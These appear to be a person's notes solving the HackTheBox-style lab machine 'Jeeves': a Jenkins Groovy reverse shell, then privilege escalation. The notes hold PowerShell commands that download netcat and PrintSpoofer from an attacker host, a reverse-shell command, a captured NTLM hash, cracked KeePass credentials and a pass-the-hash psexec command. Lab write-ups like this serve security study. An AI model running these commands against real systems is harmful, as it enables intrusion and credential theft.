# 10.129.228.112
- not a dc
- Windows 10 Pro 10586 x64

## NMAP 
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-12-16T21:35:55
|_  start_date: 2025-12-16T21:05:08
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
```

## Foothold
- tried fuzzing the 80 website. no dirs, vhosts
- tried fuzzing the 50000 website. no dirs or vhosts normally
    - fuzzed with `directory-medium` list and got `askjeeves`
    - found a jenkins portal
- ran groovy script reverse shell payload to get a reverse shell, landed in `Administrator\.jenkins`
- cd kohsuke to get user.txt - `e3232272596fb47950d59c4cf1e7066a`

## Privesc
- `whoami /priv` shows SeImpersonatepriv
- `powershell -Command "wget http://10.10.14.183/nc64.exe -o nc.exe"`
    - `powershell -Command "wget http://10.10.14.183/PrintSpoofer.exe -o psf.exe"`
    - `powershell -Command "wget http://10.10.14.183/EnableAllTokenPrivs.ps1 -o EnableAllTokenPrivs.ps1`
- `.\psf.exe -c "C:\temp\nc.exe 10.10.14.183 9001 -e C:\Windows\System32\cmd.exe"`
- did not work
- found a CEH.kdbx file in kohsuke documents.
    - started impacket-smbserver
    - copied ceh.kdbx to our smb share.
    - also got kohsuke hash
    ```
    kohsuke::JEEVES:aaaaaaaaaaaaaaaa:06b88d6f342840ee660feb264a62a860:0101000000000000006dd0ecc46edc01514c7460d3c2144e00000000010010007700440059006900760051005800740003001000770044005900690076005100580074000200100050007800520045005000750049004b000400100050007800520045005000750049004b0007000800006dd0ecc46edc010600040002000000080030003000000000000000000000000030000055e8b91c5eae116497dcd994ae520d7b2635a56fc93b952d1b6c7c3d32f7ff2e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310038003300000000000000000000000000
    ```
    - keepass2john CEH.kdbx
        - `moonshine1` is the master password
    - opening the CEH.kdbx db
    ```
    admin:F7WhTrSFDKB6sxHU1cUn
    hackerman:pwndyouall!
    bob:lCEUnYPjNfIuPZSzOySA
    administrator:lCEUnYPjNfIuPZSzOySA - dc recovery
    backup stuff - aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
    ```
    - trying the above passwords for Administrator with nxc smb
    - we find that `administrator:e0fb1fb85756c24235ff238cbe81fe00` works (pass the hash)
- since we have SMB access, we can get a shell using psexec
- `impacket-psexec administrator@10.129.228.224 -hashes :e0fb1fb85756c24235ff238cbe81fe00`
- checking `C:\Users\Administrator\Desktop`, we see hm.txt that says look deeper.
- could not find the flag in any other folder.
- hint says check in Desktop itself
- tried `dir \a \s \b` nothing worked
- `dir \r` shows alternate data streams. we see `hm.txt:root.txt:$DATA`
- `more < hm.txt:root.txt` give root flag - afbc5bd4b615a60648cec41c6ac92530
